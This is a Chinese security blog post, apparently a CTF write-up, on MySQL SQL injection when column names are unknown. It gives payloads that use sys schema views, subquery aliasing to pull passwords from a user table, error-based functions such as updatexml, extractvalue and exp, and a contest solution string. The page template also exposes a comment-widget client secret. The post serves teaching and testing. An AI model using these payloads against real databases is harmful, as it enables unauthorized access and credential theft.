@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<title>
+    
+</title>
+<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+<meta name="author" content="loecho">
+<meta name="description" content="安全行业的从业人员">
+<meta name="keywords" content="">
+<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<link rel="stylesheet" href="https://1oecho.github.io/styles/main.css" />
+<link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
+    
+            <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/js/Card/prism.min.js"></script>
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/css/Card/prism.min.css" />
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
+            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
+            
+                <!--点击特效-->
+                <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/love.min.js"></script>
+                
+                        <!--CDN样式-->
+                        <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
+                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
+                        
+                            <script>
+                                (function() {
+                                    var bp = document.createElement('script');
+                                    var curProtocol = window.location.protocol.split(':')[0];
+                                    if (curProtocol === 'https') {
+                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                                    } else {
+                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                                    }
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(bp, s);
+                                })();
+                            </script>
+                            
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo">
+                <a href="https://1oecho.github.io">
+                    
+                </a>
+            </div>
+
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                        Index
+                    </a>
+                    
+                    <a class="menu-item" href="https://1oecho.github.io/tags">
+                        Tags
+                    </a>
+                    
+                    <a class="menu-item" href="https://github.com/loecho-sec">
+                        Whoami
+                    </a>
+                    
+                        <input id="switch_default" type="checkbox" class="switch_default">
+                        <label for="switch_default" class="toggleBtn"></label>
+            </div>
+            <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+            </form>
+        </div>
+    </nav>
+
+    
+        <nav class="navbar-mobile" id="nav-mobile">
+            <div class="container">
+                <div class="navbar-header">
+                    <div>
+                        <a href="https://1oecho.github.io">
+                            
+                        </a>
+                        <!--en-->
+                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
+                        <!--zh-->
+                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
+                    </div>
+                    <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+                    </form>
+                    <!--en-->
+                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
+                    <!--zh-->
+                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>
+
+                </div>
+                <div class="menu" id="mobile-menu">
+                    
+                        <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                            Index
+                        </a>
+                        
+                        <a class="menu-item" href="https://1oecho.github.io/tags">
+                            Tags
+                        </a>
+                        
+                        <a class="menu-item" href="https://github.com/loecho-sec">
+                            Whoami
+                        </a>
+                        
+                </div>
+            </div>
+        </nav>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementById("menu-toggle-en");
+        var toggleMenu_zh = document.getElementById("menu-toggle-zh");
+
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.display != "none") {
+            if (toggleMenu.classList.contains("active")) {
+                toggleMenu.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        } else if (toggleMenu_zh.display != "none") {
+            if (toggleMenu_zh.classList.contains("active")) {
+                toggleMenu_zh.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu_zh.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        }
+
+    }
+</script>
+            <div class="main">
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                知识汇总: MySQL未知列名的注入Tips
+                            </h1>
+                            
+                                    <!--zh-->
+                                    <div class="post-meta zh">
+                                        &#x4F5C;&#x8005;:
+                                        <a itemprop="author" rel="author" href="/">
+                                            
+                                        </a>
+                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2020-06-22</a></span>
+                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
+                                    href="#">4.6
+                                    &#x5206;&#x949F;</a></span>
+                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">1101</a></span>
+                                        
+                                            <span class="post-category">&#x5206;&#x7C7B;:
+                                
+                                <a href="https://1oecho.github.io/Ty7qp_VIF/">CTF</a>
+                                
+                            </span>
+                                            
+                                                阅读量:
+                                                <span data-hk-page="current"> - </span>
+                                                
+                                    </div>
+                                    
+                        </header>
+                        
+                        <div class="post-content">
+                            <h2 id="0x01-适用场景">0x01 适用场景</h2>
+<ul>
+<li>
+<ol>
+<li>未知列名的情况下,子查询注入(设置别名),实现联合查询注入</li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li>未知列名的情况下,子查询配合报错注入,实现布尔盲注和时间盲注</li>
+</ol>
+</li>
+</ul>
+<h2 id="0x02-实际案例">0x02 实际案例</h2>
+<p>​	<strong>(1)  第一种情况:</strong></p>
+<ul>
+<li>
+<p><strong>限制条件:</strong></p>
+<ul>
+<li>过滤了OR关键字,information_schema表不能利用</li>
+</ul>
+</li>
+</ul>
+<p>正常情况下我们在联合查询注入时,通过判断列长度,以及显示位后,构造联合查询语句,查询MySQL的 information_schema 表来查询我们需要的数据,当以存在这种情况,可以通过:</p>
+<p><strong>(1). 查询sys数据库进行数据查询，使用sys数据库需要满足:</strong></p>
+<pre><code class="language-sql">     1.数据库版本大于等于5.7
+     
+     2.数据库用户为root@localohost用户
+</code></pre>
+<p><strong>Payload:</strong></p>
+<p><strong>查询所有的库：</strong></p>
+<pre><code class="language-SQL">SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;
+SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;
+</code></pre>
+<p><strong>查询指定库的表（若无则说明此表从未被访问）：</strong></p>
+<pre><code class="language-SQL">SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='loecho' GROUP BY table_name;
+SELECT table_name FROM  sys.x$schema_flattened_keys WHERE table_schema='loecho' GROUP BY table_name;
+</code></pre>
+<p><strong>统计所有访问过的表次数:库名,表名,访问次数</strong></p>
+<pre><code class="language-SQL">select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc;
+</code></pre>
+<p><strong>查看所有正在连接的用户详细信息:连接的用户(连接的用户名,连接的ip),当前库,用户状态(Sleep就是空闲),现在在执行的sql语句,上一次执行的sql语句,已经建立连接的时间(秒)</strong></p>
+<pre><code class="language-SQL">SELECT user,db,command,current_statement,last_statement,time FROM sys.session;
+</code></pre>
+<p><strong>查看所有曾连接数据库的IP,总连接次数</strong></p>
+<pre><code class="language-SQL">SELECT host,total_connections FROM sys.host_summary;
+</code></pre>
+<p>(2). 通过构造虚拟表的方式,来查询数据,也就是我们说的子查询注入,数据如下</p>
+<figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/Snipaste_2020-06-22_18-57-42.png" alt="Snipaste_2020-06-22_18-57-42" loading="lazy"></figure>
+<h4 id="具体步骤如下">具体步骤如下:</h4>
+<ol>
+<li>构造一个虚拟表</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/Snipaste_2020-06-22_19-00-43.png" alt="Snipaste_2020-06-22_19-00-43" loading="lazy"></figure>
+<ol start="2">
+<li>查询虚拟表的内容,就会查到我们需要的数据</li>
+</ol>
+<figure data-type="image" tabindex="3"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/Snipaste_2020-06-22_19-08-40.png" alt="Snipaste_2020-06-22_19-08-40" loading="lazy"></figure>
+<ol start="3">
+<li>可以发现我们构造的数据第一列为用户名,第二列为密码,我们构造查询得到所有密码</li>
+</ol>
+<figure data-type="image" tabindex="4"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/Snipaste_2020-06-22_19-12-05.png" alt="Snipaste_2020-06-22_19-12-05" loading="lazy"></figure>
+<p>4 . 实现我们的查询效果,同理第一列为用户名,在实际测试中,列名我们需要通过自己构造条件来判断,如果列数过多则会报错</p>
+<p>​	<strong>(2)  第二种情况:</strong></p>
+<p><strong>限制条件:</strong></p>
+<ul>
+<li>特殊盲注,构造语句后只会显示 Mysql Error和其他情况</li>
+<li>特殊盲注,手工构造语句,发现回显不同来构造盲注</li>
+<li>特殊盲注,<strong>mysql error的前提下延时与不延时</strong></li>
+</ul>
+<h3 id="实际案例">实际案例:</h3>
+<h4 id="2019全国大学生安全竞赛-web题目全宇宙最简单的的sql">2019全国大学生安全竞赛  Web题目:<strong>全宇宙最简单的的SQL</strong></h4>
+<figure data-type="image" tabindex="5"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/Snipaste_2020-06-22_19-53-51.png" alt="Snipaste_2020-06-22_19-53-51" loading="lazy"></figure>
+<p><strong>本题突破点:</strong></p>
+<ul>
+<li>
+<p>username 存在注入点</p>
+</li>
+<li>
+<p>过滤了 or  ||</p>
+</li>
+<li>
+<p>当最终拼接语句无错误时,无论结果如何均为 登录失败</p>
+</li>
+<li>
+<p>当最终语句有错时,返回为 数据库操作失败</p>
+</li>
+</ul>
+<p>所以我们构造Paylaod如下:</p>
+<h2 id="0-sql注入报错函数">0.) SQL注入报错函数</h2>
+<p>报错注入<strong>只适用于没有自定义错误页面，或直接返回mysql报错信息的情况下</strong>，所需条件较为苛刻，但利用难度低。 以下都以获取user为例：</p>
+<h2 id="111-count-rand导致group-by报错">1.1.1. count()、rand()导致group by报错</h2>
+<h4 id="测试方法">测试方法</h4>
+<pre><code class="language-sql">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)
+</code></pre>
+<h2 id="112-updatexml报错">1.1.2. updatexml报错</h2>
+<h4 id="测试方法-2">测试方法</h4>
+<pre><code class="language-sql">and updatexml(1,concat(0x7e,user()),1)
+</code></pre>
+<h4 id="注意事项">注意事项</h4>
+<p><strong>适用于MySQL 5.1.5及以后的版本</strong></p>
+<h2 id="113-extractvalue报错">1.1.3. extractvalue报错</h2>
+<h4 id="测试方法-3">测试方法</h4>
+<pre><code class="language-sql">and extractvalue(1,concat(0x7e,user()))
+</code></pre>
+<h4 id="注意事项-2">注意事项</h4>
+<p>适用于MySQL 5.1.5及以后的版本</p>
+<h3 id="114-其他函数">1.1.4. 其他函数</h3>
+<h5 id="测试方法-4">测试方法</h5>
+<pre><code class="language-sql">and geometrycollection((select * from(select * from(select user())a)b))
+and multipoint((select * from(select * from(select user())a)b))
+and polygon((select * from(select * from(select user())a)b))
+and multipolygon((select * from(select * from(select user())a)b))
+and linestring((select * from(select * from(select user())a)b))
+and multilinestring((select * from(select * from(select user())a)b))
+and exp(~(select * from(select user())a))
+</code></pre>
+<p><strong>1). 分析一下,通过异或来判断真假,因为过滤or关键字,不能查询information_schema表</strong></p>
+<pre><code class="language-SQL">'^(select exp(~( 查询语句 )*18446744073709551615)))#&amp;password=admin
+</code></pre>
+<p><strong>2).  而且不知道列名,完成虚拟表构造,查询虚拟表c 的 b列就是,后面查询User表的密码</strong></p>
+<pre><code class="language-SQL">(select (  (( select c.b from (select 1 as a,2 as b,3 as d from user union select * from user)c where a='admin' )) )
+
+'^(select exp(~((select (  (( select c.b from (select 1 as a,2 as b,3 as d from user union select * from user)c where a='admin' )) ))*18446744073709551615)))#&amp;password=admin
+</code></pre>
+<p><strong>3).  最后注入得到密码,进行后续操作,得到Flag</strong></p>
+
+                        </div>
+                        
+                                
+                                                    
+                                                                    <!--Share-->
+                                                                    <span style="margin-right:15px">
+                        <i class="post-share"></i>
+                        <span>&#x5206;&#x4EAB;:</span>
+                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://1oecho.github.io/c-zJSfh0F/"><i class="fa fa-qrcode"></i></a>
+                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://1oecho.github.io/c-zJSfh0F/&sharesource=qzone&title=知识汇总: MySQL未知列名的注入Tips&pics=https://1oecho.github.io/images/avatar.png?v=1702539383157&summary="><i class="fa fa-qq"></i></a>
+                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://1oecho.github.io/c-zJSfh0F/&sharesource=weibo&title=知识汇总: MySQL未知列名的注入Tips + " - " + &pic="https://1oecho.github.io/images/avatar.png?v=1702539383157 "><i class="fa fa-weibo "></i></a>
+
+                                                                    </span>
+                                                                    
+                                                                            <!--zh-->
+                                                                            <section class="post-tags zh ">
+                                                                                <div>
+                                                                                    <span>&#x6807;&#x7B7E;:</span>
+                                                                                    <span class="tag ">
+                        
+                        
+                        <a href="https://1oecho.github.io/Ty7qp_VIF/">#
+                    CTF
+                        </a>
+                        
+                            
+                                </span>
+                                                                                </div>
+                                                                                <div>
+                                                                                    <a href="javascript:window.history.back();">
+                        &#x8FD4;&#x56DE;</a>
+                                                                                    <span>&dot;</span>
+                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
+                                                                                </div>
+                                                                            </section>
+
+                                                                            
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://1oecho.github.io/oracle-sqli/">
+                                                                                            知识汇总: Oracle  注入 All in ONE
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://1oecho.github.io/CX976pZ6d/">
+                                                                                                    小工具: CobaltStrike Becon上线 微信实时推送!
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
+                </div>
+                
+                    
+                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>
+
+<script>
+    var gitalk = new Gitalk({
+        clientID: '61442cf87c4266a18189',
+        clientSecret: '7a1fd1e53e9179e32c4600883cd0612d09e0f292',
+        repo: 'loecho',
+        owner: '1oecho',
+        admin: ['1oecho'],
+        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script>
+                            
+                                        
+                                            
+            </div>
+    </div>
+    </div>
+    </div>
+    
+        <footer id="footer" class="footer">
+            <div class="copyright">
+                
+                        loecho-sec
+                            
+                                <b id="hitokoto"></b><br>
+                                
+                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
+            <path
+                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
+                fill="#93b5cf"></path>
+        </svg>
+                                         &copy;Copyright
+                                            <script>
+                                                var date = new Date();
+                                                document.write("" + date.getFullYear());
+                                            </script>
+                                            | Powered by
+                                            <a href="https://1oecho.github.io/" target="_blank">
+                                                loecho-sec
+                                            </a>
+            </div>
+            <div id="update" style="display:none;">
+                on
+            </div>
+            
+                <div id="version" style="display:none;">
+                    1.7.5
+                </div>
+                
+                    <script>
+                        var pat = '';
+                        
+                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + pat + '</div>')
+                    </script>
+        </footer>
+        
+            <script src='https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js'></script>
+            
+                <script>
+                    
+                    
+                    loadlive2d();
+                    
+                    
+                    hitokoto();
+                    
+                    getStar();
+                    hljs.initHighlighting();
+                    console.clear();
+                    
+                    CheckVersion();
+                    
+                    var newDate = new Date();
+                    newDate.setTime(1702539383157);
+                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
+                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
+                </script>
+                
+        </div>
+</body>
+<script>
+    scroll();
+</script>
+
+</html>
